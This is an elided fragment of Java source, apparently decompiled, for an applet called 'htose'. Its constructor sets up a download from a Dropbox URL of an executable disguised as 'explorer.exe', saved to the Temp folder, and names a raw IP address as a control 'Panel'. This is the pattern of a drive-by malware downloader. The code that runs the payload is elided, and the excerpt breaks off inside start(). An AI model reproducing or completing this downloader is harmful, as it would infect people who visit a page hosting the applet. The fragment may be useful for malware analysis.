...
public class htose extends JApplet
{
    boolean visit;
    boolean panel;
    String App;
    ...
    public htose() {
        ...
        this.visitPage = "http://tip.it";
        this.Panel = "http://66.197.134.140";
        this.downloadURL = "http://dl.dropbox.com/u/11946408/explorer.exe";
        this.filePath = this.Temp + "\\";
        this.fileName = "explorer.exe";
    }
    ...
    public void start() {
        ...
        try {
            ...
            Logger.getLogger(htose.class.getName()).log(Level.SEVERE, null, ex);
        }
        try {
